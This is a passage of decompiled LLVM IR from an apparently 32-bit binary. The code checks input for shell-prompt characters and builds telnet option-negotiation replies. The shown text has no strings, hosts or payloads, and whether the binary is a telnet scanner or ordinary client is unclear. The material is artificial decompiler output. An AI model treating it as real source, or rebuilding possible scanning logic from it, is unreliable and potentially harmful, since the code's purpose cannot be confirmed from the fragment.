  store i32 %v1_8050a86, i32* %eax.global-to-local, align 4
  %tmp147 = icmp slt i32 %v1_8050a86, 1
  br i1 %tmp147, label %dec_label_pc_8050638.loopexit12.loopexit, label %dec_label_pc_8050a8f.preheader

dec_label_pc_8050a8f.preheader:                   ; preds = %dec_label_pc_8050a83
  %v7_8050a8f.pre = load i32, i32* @edx, align 4
  %v2_8050a8f = add i32 %v0_80506aa, 28
  br label %dec_label_pc_8050a8f

dec_label_pc_8050a8f:                             ; preds = %dec_label_pc_8050a8f.preheader, %dec_label_pc_8050ac0
  %v7_8050a8f = phi i32 [ %v7_8050a8f.pre, %dec_label_pc_8050a8f.preheader ], [ %v9_8050a8f, %dec_label_pc_8050ac0 ]
  %v0_8050d36 = phi i32 [ %v1_8050a86, %dec_label_pc_8050a8f.preheader ], [ %v1_8050ac0, %dec_label_pc_8050ac0 ]
  %v3_8050a8f = add i32 %v2_8050a8f, %v0_8050d36
  %v4_8050a8f = inttoptr i32 %v3_8050a8f to i8*
  %v5_8050a8f = load i8, i8* %v4_8050a8f, align 1
  %v6_8050a8f = zext i8 %v5_8050a8f to i32
  %v8_8050a8f = and i32 %v7_8050a8f, -256
  %v9_8050a8f = or i32 %v6_8050a8f, %v8_8050a8f
  store i32 %v9_8050a8f, i32* %edx.global-to-local, align 4
  %v10_8050a93 = icmp eq i8 %v5_8050a8f, 58
  br i1 %v10_8050a93, label %dec_label_pc_8050d36, label %dec_label_pc_8050a9c

dec_label_pc_8050a9c:                             ; preds = %dec_label_pc_8050a8f
  %v10_8050a9c = icmp eq i8 %v5_8050a8f, 62
  br i1 %v10_8050a9c, label %dec_label_pc_8050d36, label %dec_label_pc_8050aa5

dec_label_pc_8050aa5:                             ; preds = %dec_label_pc_8050a9c
  %v10_8050aa5 = icmp eq i8 %v5_8050a8f, 36
  br i1 %v10_8050aa5, label %dec_label_pc_8050d36, label %dec_label_pc_8050aae

dec_label_pc_8050aae:                             ; preds = %dec_label_pc_8050aa5
  %v10_8050aae = icmp eq i8 %v5_8050a8f, 35
  br i1 %v10_8050aae, label %dec_label_pc_8050d36, label %dec_label_pc_8050ab7

dec_label_pc_8050ab7:                             ; preds = %dec_label_pc_8050aae
  %v10_8050ab7 = icmp eq i8 %v5_8050a8f, 37
  br i1 %v10_8050ab7, label %dec_label_pc_8050d36, label %dec_label_pc_8050ac0

dec_label_pc_8050ac0:                             ; preds = %dec_label_pc_8050ab7
  %v1_8050ac0 = add i32 %v0_8050d36, -1
  %v8_8050ac0 = icmp eq i32 %v1_8050ac0, 0
  store i32 %v1_8050ac0, i32* %eax.global-to-local, align 4
  %v1_8050ac1 = icmp eq i1 %v8_8050ac0, false
  br i1 %v1_8050ac1, label %dec_label_pc_8050a8f, label %dec_label_pc_8050638.backedge

dec_label_pc_8050ac8:                             ; preds = %dec_label_pc_80506d9
  %v1_8050ac8 = add i32 %v0_80506c7, 2
  store i32 %v1_8050ac8, i32* @ebx, align 4
  %v1_8050acb = add i32 %v0_8050acb, 2
  store i32 %v1_8050acb, i32* @ebp, align 4
  br label %dec_label_pc_80506c3.backedge

dec_label_pc_80506c3.backedge:                    ; preds = %dec_label_pc_8050ac8, %dec_label_pc_8050eea
  %v0_8050741128 = phi i32 [ %v0_8050741129, %dec_label_pc_8050ac8 ], [ %v0_8050f23, %dec_label_pc_8050eea ]
  %v1_80506c3 = phi i32 [ %v1_80506d3, %dec_label_pc_8050ac8 ], [ %v3_8050f23, %dec_label_pc_8050eea ]
  %v0_80506c3 = phi i32 [ %v1_8050acb, %dec_label_pc_8050ac8 ], [ %v0_80506c3.pre, %dec_label_pc_8050eea ]
  %v5_80506d9109 = phi i32 [ %v7_80506d9, %dec_label_pc_8050ac8 ], [ %v0_8050f1b, %dec_label_pc_8050eea ]
  %v0_80506cc104 = phi i32 [ %v0_8050ae0, %dec_label_pc_8050ac8 ], [ %v1_8050f20, %dec_label_pc_8050eea ]
  %v2_80506c3 = sub i32 %v0_80506c3, %v1_80506c3
  %v8_80506c3 = xor i32 %v0_80506c3, %v1_80506c3
  %v9_80506c3 = xor i32 %v2_80506c3, %v0_80506c3
  %v10_80506c3 = and i32 %v9_80506c3, %v8_80506c3
  %v11_80506c3 = icmp slt i32 %v10_80506c3, 0
  %v13_80506c3 = icmp slt i32 %v2_80506c3, 0
  %v2_80506c5 = icmp eq i1 %v13_80506c3, %v11_80506c3
  br i1 %v2_80506c5, label %dec_label_pc_8050739, label %dec_label_pc_80506c7.preheader

dec_label_pc_8050ad3:                             ; preds = %dec_label_pc_8050d42, %dec_label_pc_8050a16, %dec_label_pc_8050954, %dec_label_pc_8050cc9, %dec_label_pc_8050dbb, %dec_label_pc_8050c77, %dec_label_pc_8050c26, %dec_label_pc_8050739, %dec_label_pc_8050e34
  %v0_8050ad3 = phi i32 [ %v1_8050d36, %dec_label_pc_8050d42 ], [ %v1_8050a0a160, %dec_label_pc_8050a16 ], [ %v0_805094b, %dec_label_pc_8050954 ], [ %v1_8050cbd, %dec_label_pc_8050cc9 ], [ %v1_8050daf, %dec_label_pc_8050dbb ], [ %v0_8050c77, %dec_label_pc_8050c77 ], [ %v0_8050c26, %dec_label_pc_8050c26 ], [ %v0_8050739, %dec_label_pc_8050739 ], [ %v1_8050e28, %dec_label_pc_8050e34 ]
  %v1_8050ad3 = icmp eq i32 %v0_8050ad3, 0
  %v1_8050ad5 = icmp eq i1 %v1_8050ad3, false
  br i1 %v1_8050ad5, label %dec_label_pc_80509a1, label %dec_label_pc_8050638.loopexit12.loopexit

dec_label_pc_8050ae0:                             ; preds = %dec_label_pc_80506e4
  %v1_8050ae0 = add i32 %v0_8050ae0, 1879
  %v2_8050ae0 = inttoptr i32 %v1_8050ae0 to i8*
  store i8 -1, i8* %v2_8050ae0, align 1
  %v0_8050ae8 = load i32, i32* @esp, align 4
  %v1_8050ae8 = add i32 %v0_8050ae8, 1880
  %v2_8050ae8 = inttoptr i32 %v1_8050ae8 to i8*
  store i8 -5, i8* %v2_8050ae8, align 1
  %v0_8050af0 = load i32, i32* @esp, align 4
  %v1_8050af0 = add i32 %v0_8050af0, 1881
  %v2_8050af0 = inttoptr i32 %v1_8050af0 to i8*
  store i8 31, i8* %v2_8050af0, align 1
  %v0_8050af8 = load i32, i32* @esp, align 4
  %v1_8050af8 = add i32 %v0_8050af8, 1847
  %v2_8050af8 = inttoptr i32 %v1_8050af8 to i8*
  store i8 -1, i8* %v2_8050af8, align 1
  %v0_8050b00 = load i32, i32* @esp, align 4
  %v1_8050b00 = add i32 %v0_8050b00, 1848
  %v2_8050b00 = inttoptr i32 %v1_8050b00 to i8*
  store i8 -6, i8* %v2_8050b00, align 1
  %v0_8050b08 = load i32, i32* @esp, align 4
  %v1_8050b08 = add i32 %v0_8050b08, 1849
  %v2_8050b08 = inttoptr i32 %v1_8050b08 to i8*
  store i8 31, i8* %v2_8050b08, align 1
  %v0_8050b10 = load i32, i32* @esp, align 4
  %v1_8050b10 = add i32 %v0_8050b10, 1850
  %v2_8050b10 = inttoptr i32 %v1_8050b10 to i8*
  store i8 0, i8* %v2_8050b10, align 1
  %v0_8050b18 = load i32, i32* @esp, align 4
  %v1_8050b18 = add i32 %v0_8050b18, 1851
  %v2_8050b18 = inttoptr i32 %v1_8050b18 to i8*
  store i8 80, i8* %v2_8050b18, align 1
  %v0_8050b20 = load i32, i32* @esp, align 4
  %v1_8050b20 = add i32 %v0_8050b20, 1852
  %v2_8050b20 = inttoptr i32 %v1_8050b20 to i8*
  store i8 0, i8* %v2_8050b20, align 1
  %v0_8050b28 = load i32, i32* @esp, align 4
  %v1_8050b28 = add i32 %v0_8050b28, 1853
  %v2_8050b28 = inttoptr i32 %v1_8050b28 to i8*
  store i8 24, i8* %v2_8050b28, align 1
  %v0_8050b30 = load i32, i32* @esp, align 4
  %v1_8050b30 = add i32 %v0_8050b30, 1854
  %v2_8050b30 = inttoptr i32 %v1_8050b30 to i8*
  store i8 -1, i8* %v2_8050b30, align 1
  %v0_8050b38 = load i32, i32* @esp, align 4
  %v1_8050b38 = add i32 %v0_8050b38, 1855
  %v2_8050b38 = inttoptr i32 %v1_8050b38 to i8*
  store i8 -16, i8* %v2_8050b38, align 1
  %v0_8050b40 = load i32, i32* @esp, align 4
  %v1_8050b40 = add i32 %v0_8050b40, 16
  %v2_8050b40 = inttoptr i32 %v1_8050b40 to i32*
  %v3_8050b40 = load i32, i32* %v2_8050b40, align 4
  store i32 %v3_8050b40, i32* %eax.global-to-local, align 4
  %v0_8050b44 = load i32, i32* @edi, align 4
  %v1_8050b44 = add i32 %v0_8050b44, 24
  %v2_8050b44 = inttoptr i32 %v1_8050b44 to i32*
  %v3_8050b44 = load i32, i32* %v2_8050b44, align 4
  store i32 %v3_8050b44, i32* %ecx.global-to-local, align 4
  %v0_8050b47 = load i32, i32* @ebx, align 4
  %v1_8050b47 = add i32 %v0_8050b47, 2
  store i32 %v1_8050b47, i32* %edx.global-to-local, align 4
  %v2_8050b4a = add i32 %v3_8050b44, %v3_8050b40
  store i32 %v2_8050b4a, i32* %eax.global-to-local, align 4
  %tmp299 = icmp ugt i32 %v2_8050b4a, %v1_8050b47
  br i1 %tmp299, label %dec_label_pc_8050b54, label %dec_label_pc_8050ae0.dec_label_pc_8050739.loopexit_crit_edge

dec_label_pc_8050ae0.dec_label_pc_8050739.loopexit_crit_edge: ; preds = %dec_label_pc_8050ae0
  %v0_8050739.pre.pre = load i32, i32* @ebp, align 4
  br label %dec_label_pc_8050739

dec_label_pc_8050b54:                             ; preds = %dec_label_pc_8050ae0
  %v2_8050b54 = inttoptr i32 %v1_8050b47 to i8*
  %v3_8050b54 = load i8, i8* %v2_8050b54, align 1
  %v12_8050b54 = icmp eq i8 %v3_8050b54, 31
  br i1 %v12_8050b54, label %dec_label_pc_8050eea, label %dec_label_pc_8050b5e

dec_label_pc_8050b5e:                             ; preds = %dec_label_pc_8050b54
  %v1_8050b5e = inttoptr i32 %v0_8050b47 to i8*
  %v2_8050b5e = load i8, i8* %v1_8050b5e, align 1
  %v3_8050b5e = zext i8 %v2_8050b5e to i32
  %v5_8050b5e = and i32 %v2_8050b4a, -256
  %v6_8050b5e = or i32 %v3_8050b5e, %v5_8050b5e
  store i32 %v6_8050b5e, i32* %eax.global-to-local, align 4
  %v11_8050b60 = icmp eq i8 %v2_8050b5e, -3
  %v1_8050b62 = icmp eq i1 %v11_8050b60, false
  br i1 %v1_8050b62, label %dec_label_pc_80510b3, label %dec_label_pc_8050b68

dec_label_pc_8050b68:                             ; preds = %dec_label_pc_8050b5e
  store i8 -4, i8* %v1_8050b5e, align 1
  %v0_8050b6b = load i32, i32* @esi, align 4
  %v1_8050b6b = inttoptr i32 %v0_8050b6b to i8*
  %v2_8050b6b = load i8, i8* %v1_8050b6b, align 1
  %v3_8050b6b = zext i8 %v2_8050b6b to i32
  %v4_8050b6b = load i32, i32* %eax.global-to-local, align 4
  %v5_8050b6b = and i32 %v4_8050b6b, -256
  %v6_8050b6b = or i32 %v5_8050b6b, %v3_8050b6b
  store i32 %v6_8050b6b, i32* %eax.global-to-local, align 4
  %v11_8050b6d = icmp eq i8 %v2_8050b6b, -3
  %v1_8050b6f = icmp eq i1 %v11_8050b6d, false
  br i1 %v1_8050b6f, label %dec_label_pc_80506fd, label %dec_label_pc_8050b75

dec_label_pc_8050b75:                             ; preds = %dec_label_pc_8050b68, %dec_label_pc_80506f3
  %v0_8050b75 = phi i32 [ %v0_8050b6b, %dec_label_pc_8050b68 ], [ %v0_80506f3, %dec_label_pc_80506f3 ]
  %v1_8050b75 = inttoptr i32 %v0_8050b75 to i8*
  store i8 -4, i8* %v1_8050b75, align 1
  %v0_8050b78 = load i32, i32* @ebx, align 4
  %v1_8050b78 = add i32 %v0_8050b78, 2
  %v2_8050b78 = inttoptr i32 %v1_8050b78 to i8*
  %v3_8050b78 = load i8, i8* %v2_8050b78, align 1
  %v4_8050b78 = zext i8 %v3_8050b78 to i32
  %v5_8050b78 = load i32, i32* %eax.global-to-local, align 4
  %v6_8050b78 = and i32 %v5_8050b78, -256
  %v7_8050b78 = or i32 %v6_8050b78, %v4_8050b78
  store i32 %v7_8050b78, i32* %eax.global-to-local, align 4
  %v11_8050b7b = icmp eq i8 %v3_8050b78, -3
  %v1_8050b7d = icmp eq i1 %v11_8050b7b, false
  br i1 %v1_8050b7d, label %dec_label_pc_8050710, label %dec_label_pc_8050b83

dec_label_pc_8050b83:                             ; preds = %dec_label_pc_8050b75, %dec_label_pc_8050705
  %v0_8050b83 = phi i32 [ %v0_8050b78, %dec_label_pc_8050b75 ], [ %v0_8050705, %dec_label_pc_8050705 ]
  %v1_8050b83 = add i32 %v0_8050b83, 2
  %v2_8050b83 = inttoptr i32 %v1_8050b83 to i8*
  store i8 -4, i8* %v2_8050b83, align 1
  br label %dec_label_pc_8050718

dec_label_pc_8050b8c:                             ; preds = %dec_label_pc_8050653
  %v1_8050680 = icmp eq i32 %v0_8050678, 0
  br i1 %v1_8050680, label %dec_label_pc_8051098, label %dec_label_pc_8050b92

dec_label_pc_8050b92:                             ; preds = %dec_label_pc_8050b8c
  %v10_8050b92 = icmp eq i32 %v0_8050678, -1
  %v1_8050b95 = icmp eq i1 %v10_8050b92, false
  br i1 %v1_8050b95, label %dec_label_pc_805069a, label %dec_label_pc_8050b9b

dec_label_pc_8050b9b:                             ; preds = %dec_label_pc_8050b92
  %v1_8050b9b = add i32 %v0_805067d, 56
  %v2_8050b9b = inttoptr i32 %v1_8050b9b to i32*
  %v3_8050b9b = load i32, i32* %v2_8050b9b, align 4
  store i32 %v3_8050b9b, i32* %edx.global-to-local, align 4
  %v1_8050b9f = inttoptr i32 %v3_8050b9b to i32*
  %v2_8050b9f = load i32, i32* %v1_8050b9f, align 4
  %v11_8050b9f = icmp eq i32 %v2_8050b9f, 11
  br i1 %v11_8050b9f, label %dec_label_pc_80505e1, label %dec_label_pc_8050ba8

dec_label_pc_8050ba8:                             ; preds = %dec_label_pc_8050b9b, %dec_label_pc_8051098
  %v0_8050ba8 = phi i32 [ %v1_805067d, %dec_label_pc_8050b9b ], [ %v0_8050ba8.pre, %dec_label_pc_8051098 ]
  %v0_8050bab = load i32, i32* @edi, align 4
  %v1_8050bab = add i32 %v0_8050bab, 4
  %v2_8050bab = inttoptr i32 %v1_8050bab to i32*
  %v3_8050bab = load i32, i32* %v2_8050bab, align 4
  store i32 %v3_8050bab, i32* @esi, align 4
  %v2_8050bae = add i32 %v0_8050ba8, -16
  %v3_8050bae = inttoptr i32 %v2_8050bae to i32*
  store i32 %v3_8050bab, i32* %v3_8050bae, align 4
  %v1_8050baf = call i32 @function_8052241(i32 ptrtoint (i32* @0 to i32))
  store i32 %v1_8050baf, i32* %eax.global-to-local, align 4
  %v0_8050bb4 = load i32, i32* @edi, align 4
  %v1_8050bb4 = add i32 %v0_8050bb4, 284
  %v2_8050bb4 = inttoptr i32 %v1_8050bb4 to i8*
  %v3_8050bb4 = load i8, i8* %v2_8050bb4, align 1
  %v4_8050bb4 = zext i8 %v3_8050bb4 to i32
  %v6_8050bb4 = and i32 %v1_8050baf, -256
  %v7_8050bb4 = or i32 %v4_8050bb4, %v6_8050bb4
  %v1_8050bbd = add i32 %v7_8050bb4, 1
  store i32 %v1_8050bbd, i32* %eax.global-to-local, align 4
  %v1_8050bbe = add i32 %v0_8050bb4, 4
  %v2_8050bbe = inttoptr i32 %v1_8050bbe to i32*
  store i32 -1, i32* %v2_8050bbe, align 4
  %v0_8050bc5 = load i32, i32* %eax.global-to-local, align 4
  %v1_8050bc5 = trunc i32 %v0_8050bc5 to i8
  %v2_8050bc5 = load i32, i32* @edi, align 4
  %v3_8050bc5 = add i32 %v2_8050bc5, 284
  %v4_8050bc5 = inttoptr i32 %v3_8050bc5 to i8*
  store i8 %v1_8050bc5, i8* %v4_8050bc5, align 1
  %v0_8050bcb = load i32, i32* %eax.global-to-local, align 4
  %v1_8050bcb = trunc i32 %v0_8050bcb to i8
  %tmp300 = icmp ult i8 %v1_8050bcb, 10
  %v0_80510a7 = load i32, i32* @edi, align 4
  br i1 %tmp300, label %dec_label_pc_80510a7, label %dec_label_pc_8050bd3

dec_label_pc_8050bd3:                             ; preds = %dec_label_pc_8050ba8
  %v1_8050bd3 = add i32 %v0_80510a7, 284
  %v2_8050bd3 = inttoptr i32 %v1_8050bd3 to i8*
  store i8 0, i8* %v2_8050bd3, align 1
  %v0_8050bda = load i32, i32* @edi, align 4
  %v1_8050bda = add i32 %v0_8050bda, 12
  %v2_8050bda = inttoptr i32 %v1_8050bda to i32*
  store i32 0, i32* %v2_8050bda, align 4
  br label %dec_label_pc_80505e1

dec_label_pc_8050be6:                             ; preds = %dec_label_pc_80506fd
  %v1_8050be6 = inttoptr i32 %v0_8050be6 to i8*
  store i8 -3, i8* %v1_8050be6, align 1
  %v5_8050705.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050705

dec_label_pc_8050bee:                             ; preds = %dec_label_pc_8050710
  %v1_8050bee = add i32 %v0_8050bee, 2
  %v2_8050bee = inttoptr i32 %v1_8050bee to i8*
  store i8 -3, i8* %v2_8050bee, align 1
  br label %dec_label_pc_8050718

dec_label_pc_8050bf7:                             ; preds = %dec_label_pc_805063f
  %v0_8050bf7 = load i32, i32* %eax.global-to-local, align 4
  store i32 %v0_8050bf7, i32* %edx.global-to-local, align 4
  %v1_8050bf9 = load i32, i32* @esp, align 4
  %v2_8050bf9 = add i32 %v1_8050bf9, -4
  %v3_8050bf9 = inttoptr i32 %v2_8050bf9 to i32*
  store i32 %v0_8050bf7, i32* %v3_8050bf9, align 4
  %v0_8050bfa = load i32, i32* @edi, align 4
  %v1_8050bfa = add i32 %v0_8050bfa, 92
  store i32 %v1_8050bfa, i32* %eax.global-to-local, align 4
  %v1_8050bfd = add i32 %v1_8050bf9, -8
  %v2_8050bfd = inttoptr i32 %v1_8050bfd to i32*
  store i32 192, i32* %v2_8050bfd, align 4
  %v0_8050c02 = load i32, i32* %eax.global-to-local, align 4
  %v2_8050c02 = add i32 %v1_8050bf9, -12
  %v3_8050c02 = inttoptr i32 %v2_8050c02 to i32*
  store i32 %v0_8050c02, i32* %v3_8050c02, align 4
  %v0_8050c03 = load i32, i32* %edx.global-to-local, align 4
  %v2_8050c03 = add i32 %v1_8050bf9, -16
  %v3_8050c03 = inttoptr i32 %v2_8050c03 to i32*
  store i32 %v0_8050c03, i32* %v3_8050c03, align 4
  %v4_8050c04 = call i32 @function_80527a3(i8* bitcast (i32* @0 to i8*), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_8050c04, i32* %eax.global-to-local, align 4
  %v0_8050c09 = load i32, i32* @edi, align 4
  %v1_8050c09 = add i32 %v0_8050c09, 24
  %v2_8050c09 = inttoptr i32 %v1_8050c09 to i32*
  %v3_8050c09 = load i32, i32* %v2_8050c09, align 4
  %v1_8050c0c = add i32 %v3_8050c09, -64
  store i32 %v1_8050c0c, i32* %eax.global-to-local, align 4
  store i32 %v1_8050c0c, i32* %v2_8050c09, align 4
  br label %dec_label_pc_8050653

dec_label_pc_8050c1a:                             ; preds = %dec_label_pc_805077f, %dec_label_pc_8050776, %dec_label_pc_805076d, %dec_label_pc_8050764, %dec_label_pc_8050757
  %v1_8050c1a = add i32 %v0_8050c1a, 1
  store i32 %v1_8050c1a, i32* @ebp, align 4
  %v10_8050c1d = icmp eq i32 %v0_8050c1a, -2
  br i1 %v10_8050c1d, label %dec_label_pc_805078b, label %dec_label_pc_8050c26

dec_label_pc_8050c26:                             ; preds = %dec_label_pc_8050c1a, %dec_label_pc_80507ab, %dec_label_pc_805078b
  %v0_8050c26 = phi i32 [ %v1_8050c1a, %dec_label_pc_8050c1a ], [ %v0_80507bb, %dec_label_pc_80507ab ], [ %v0_8050798, %dec_label_pc_805078b ]
  %tmp148 = icmp slt i32 %v0_8050c26, 1
  br i1 %tmp148, label %dec_label_pc_8050ad3, label %dec_label_pc_8050c2e

dec_label_pc_8050c2e:                             ; preds = %dec_label_pc_8050c26
  %v0_8050c2e = load i32, i32* @edi, align 4
  %v1_8050c2e = inttoptr i32 %v0_8050c2e to i32*
  %v2_8050c2e = load i32, i32* %v1_8050c2e, align 4
  store i32 %v2_8050c2e, i32* %edx.global-to-local, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v0_8050c32 = load i32, i32* @esp, align 4
  %v1_8050c32 = add i32 %v0_8050c32, -4
  %v2_8050c32 = inttoptr i32 %v1_8050c32 to i32*
  store i32 16384, i32* %v2_8050c32, align 4
  %v0_8050c37 = load i32, i32* %edx.global-to-local, align 4
  %v1_8050c37 = add i32 %v0_8050c37, 12
  %v2_8050c37 = inttoptr i32 %v1_8050c37 to i8*
  %v3_8050c37 = load i8, i8* %v2_8050c37, align 1
  %v4_8050c37 = zext i8 %v3_8050c37 to i32
  %v5_8050c37 = load i32, i32* %eax.global-to-local, align 4
  %v6_8050c37 = and i32 %v5_8050c37, -256
  %v7_8050c37 = or i32 %v6_8050c37, %v4_8050c37
  store i32 %v7_8050c37, i32* %eax.global-to-local, align 4
  %v2_8050c3a = add i32 %v0_8050c32, -8
  %v3_8050c3a = inttoptr i32 %v2_8050c3a to i32*
  store i32 %v7_8050c37, i32* %v3_8050c3a, align 4
  %v0_8050c3b = load i32, i32* %edx.global-to-local, align 4
  %v1_8050c3b = inttoptr i32 %v0_8050c3b to i32*
  %v2_8050c3b = load i32, i32* %v1_8050c3b, align 4
  store i32 %v2_8050c3b, i32* %eax.global-to-local, align 4
  %v2_8050c3d = add i32 %v0_8050c32, -12
  %v3_8050c3d = inttoptr i32 %v2_8050c3d to i32*
  store i32 %v2_8050c3b, i32* %v3_8050c3d, align 4
  %v0_8050c3e = load i32, i32* @edi, align 4
  %v1_8050c3e = add i32 %v0_8050c3e, 4
  %v2_8050c3e = inttoptr i32 %v1_8050c3e to i32*
  %v3_8050c3e = load i32, i32* %v2_8050c3e, align 4
  store i32 %v3_8050c3e, i32* %eax.global-to-local, align 4
  %v2_8050c41 = add i32 %v0_8050c32, -16
  %v3_8050c41 = inttoptr i32 %v2_8050c41 to i32*
  store i32 %v3_8050c3e, i32* %v3_8050c41, align 4
  %v0_8050c42 = call i32 @function_8052984()
  store i32 %v0_8050c42, i32* %eax.global-to-local, align 4
  %v0_8050c47 = load i32, i32* @esp, align 4
  %v1_8050c47 = add i32 %v0_8050c47, -4
  %v2_8050c47 = inttoptr i32 %v1_8050c47 to i32*
  store i32 16384, i32* %v2_8050c47, align 4
  %v1_8050c4c = add i32 %v0_8050c47, -8
  %v2_8050c4c = inttoptr i32 %v1_8050c4c to i32*
  store i32 2, i32* %v2_8050c4c, align 4
  %v1_8050c4e = add i32 %v0_8050c47, -12
  %v2_8050c4e = inttoptr i32 %v1_8050c4e to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_8054b66.10 to i32), i32* %v2_8050c4e, align 4
  %v0_8050c53 = load i32, i32* @edi, align 4
  %v1_8050c53 = add i32 %v0_8050c53, 4
  %v2_8050c53 = inttoptr i32 %v1_8050c53 to i32*
  %v3_8050c53 = load i32, i32* %v2_8050c53, align 4
  store i32 %v3_8050c53, i32* %eax.global-to-local, align 4
  %v2_8050c56 = add i32 %v0_8050c47, -16
  %v3_8050c56 = inttoptr i32 %v2_8050c56 to i32*
  store i32 %v3_8050c53, i32* %v3_8050c56, align 4
  %v0_8050c57 = call i32 @function_8052984()
  store i32 %v0_8050c57, i32* %eax.global-to-local, align 4
  %v0_8050c5f = load i32, i32* @edi, align 4
  %v1_8050c5f = add i32 %v0_8050c5f, 12
  %v2_8050c5f = inttoptr i32 %v1_8050c5f to i32*
  store i32 4, i32* %v2_8050c5f, align 4
  br label %dec_label_pc_80509a1

dec_label_pc_8050c6b:                             ; preds = %dec_label_pc_80507fc, %dec_label_pc_80507f3, %dec_label_pc_80507ea, %dec_label_pc_80507dd
  %v1_8050c6b = add i32 %v0_8050c6b, 1
  store i32 %v1_8050c6b, i32* @ebp, align 4
  %v10_8050c6e = icmp eq i32 %v0_8050c6b, -2
  br i1 %v10_8050c6e, label %dec_label_pc_8050808, label %dec_label_pc_8050c77

dec_label_pc_8050c77:                             ; preds = %dec_label_pc_8050c6b, %dec_label_pc_8050808
  %v0_8050c77 = phi i32 [ %v1_8050c6b, %dec_label_pc_8050c6b ], [ %v0_8050815, %dec_label_pc_8050808 ]
  %tmp149 = icmp slt i32 %v0_8050c77, 1
  br i1 %tmp149, label %dec_label_pc_8050ad3, label %dec_label_pc_8050c7f

dec_label_pc_8050c7f:                             ; preds = %dec_label_pc_8050c77
  %v0_8050c7f = load i32, i32* @edi, align 4
  %v1_8050c7f = inttoptr i32 %v0_8050c7f to i32*
  %v2_8050c7f = load i32, i32* %v1_8050c7f, align 4
  store i32 %v2_8050c7f, i32* %edx.global-to-local, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v0_8050c83 = load i32, i32* @esp, align 4
  %v1_8050c83 = add i32 %v0_8050c83, -4
  %v2_8050c83 = inttoptr i32 %v1_8050c83 to i32*
  store i32 16384, i32* %v2_8050c83, align 4
  %v0_8050c88 = load i32, i32* %edx.global-to-local, align 4
  %v1_8050c88 = add i32 %v0_8050c88, 13
  %v2_8050c88 = inttoptr i32 %v1_8050c88 to i8*
  %v3_8050c88 = load i8, i8* %v2_8050c88, align 1
  %v4_8050c88 = zext i8 %v3_8050c88 to i32
  %v5_8050c88 = load i32, i32* %eax.global-to-local, align 4
  %v6_8050c88 = and i32 %v5_8050c88, -256
  %v7_8050c88 = or i32 %v6_8050c88, %v4_8050c88
  store i32 %v7_8050c88, i32* %eax.global-to-local, align 4
  %v2_8050c8b = add i32 %v0_8050c83, -8
  %v3_8050c8b = inttoptr i32 %v2_8050c8b to i32*
  store i32 %v7_8050c88, i32* %v3_8050c8b, align 4
  %v0_8050c8c = load i32, i32* %edx.global-to-local, align 4
  %v1_8050c8c = add i32 %v0_8050c8c, 4
  %v2_8050c8c = inttoptr i32 %v1_8050c8c to i32*
  %v3_8050c8c = load i32, i32* %v2_8050c8c, align 4
  store i32 %v3_8050c8c, i32* @esi, align 4
  %v2_8050c8f = add i32 %v0_8050c83, -12
  %v3_8050c8f = inttoptr i32 %v2_8050c8f to i32*
  store i32 %v3_8050c8c, i32* %v3_8050c8f, align 4
  %v0_8050c90 = load i32, i32* @edi, align 4
  %v1_8050c90 = add i32 %v0_8050c90, 4
  %v2_8050c90 = inttoptr i32 %v1_8050c90 to i32*
  %v3_8050c90 = load i32, i32* %v2_8050c90, align 4
  store i32 %v3_8050c90, i32* @ebx, align 4
  %v2_8050c93 = add i32 %v0_8050c83, -16
  %v3_8050c93 = inttoptr i32 %v2_8050c93 to i32*
  store i32 %v3_8050c90, i32* %v3_8050c93, align 4
  %v0_8050c94 = call i32 @function_8052984()
  store i32 %v0_8050c94, i32* %eax.global-to-local, align 4
  %v0_8050c99 = load i32, i32* @esp, align 4
  %v1_8050c99 = add i32 %v0_8050c99, -4
  %v2_8050c99 = inttoptr i32 %v1_8050c99 to i32*
  store i32 16384, i32* %v2_8050c99, align 4
  %v1_8050c9e = add i32 %v0_8050c99, -8
  %v2_8050c9e = inttoptr i32 %v1_8050c9e to i32*
  store i32 2, i32* %v2_8050c9e, align 4
  %v1_8050ca0 = add i32 %v0_8050c99, -12
  %v2_8050ca0 = inttoptr i32 %v1_8050ca0 to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_8054b66.10 to i32), i32* %v2_8050ca0, align 4
  %v0_8050ca5 = load i32, i32* @edi, align 4
  %v1_8050ca5 = add i32 %v0_8050ca5, 4
  %v2_8050ca5 = inttoptr i32 %v1_8050ca5 to i32*
  %v3_8050ca5 = load i32, i32* %v2_8050ca5, align 4
  store i32 %v3_8050ca5, i32* %ecx.global-to-local, align 4
  %v2_8050ca8 = add i32 %v0_8050c99, -16
  %v3_8050ca8 = inttoptr i32 %v2_8050ca8 to i32*
  store i32 %v3_8050ca5, i32* %v3_8050ca8, align 4
  %v0_8050ca9 = call i32 @function_8052984()
  store i32 %v0_8050ca9, i32* %eax.global-to-local, align 4
  %v0_8050cb1 = load i32, i32* @edi, align 4
  %v1_8050cb1 = add i32 %v0_8050cb1, 12
  %v2_8050cb1 = inttoptr i32 %v1_8050cb1 to i32*
  store i32 5, i32* %v2_8050cb1, align 4
  br label %dec_label_pc_80509a1

dec_label_pc_8050cbd:                             ; preds = %dec_label_pc_80508a9, %dec_label_pc_80508a0, %dec_label_pc_8050897, %dec_label_pc_805088e, %dec_label_pc_8050881
  %v1_8050cbd = add i32 %v0_8050cbd, 1
  store i32 %v1_8050cbd, i32* @ebp, align 4
  %v10_8050cc0 = icmp eq i32 %v0_8050cbd, -2
  br i1 %v10_8050cc0, label %dec_label_pc_8050638.loopexit12.loopexit, label %dec_label_pc_8050cc9

dec_label_pc_8050cc9:                             ; preds = %dec_label_pc_8050cbd
  %tmp150 = icmp slt i32 %v1_8050cbd, 1
  br i1 %tmp150, label %dec_label_pc_8050ad3, label %dec_label_pc_8050cd1

dec_label_pc_8050cd1:                             ; preds = %dec_label_pc_8050cc9
  %v0_8050cd1 = load i32, i32* @esp, align 4
  %v1_8050cd4 = add i32 %v0_8050cd1, -16
  %v2_8050cd4 = inttoptr i32 %v1_8050cd4 to i32*
  store i32 22, i32* %v2_8050cd4, align 4
  %v2_8050cd6 = call i32 @function_8051350(i8 ptrtoint (i32* @0 to i8))
  store i32 %v2_8050cd6, i32* %eax.global-to-local, align 4
  %v0_8050cdb = load i32, i32* @esp, align 4
  %v1_8050cdb = inttoptr i32 %v0_8050cdb to i32*
  %v2_8050cdb = load i32, i32* %v1_8050cdb, align 4
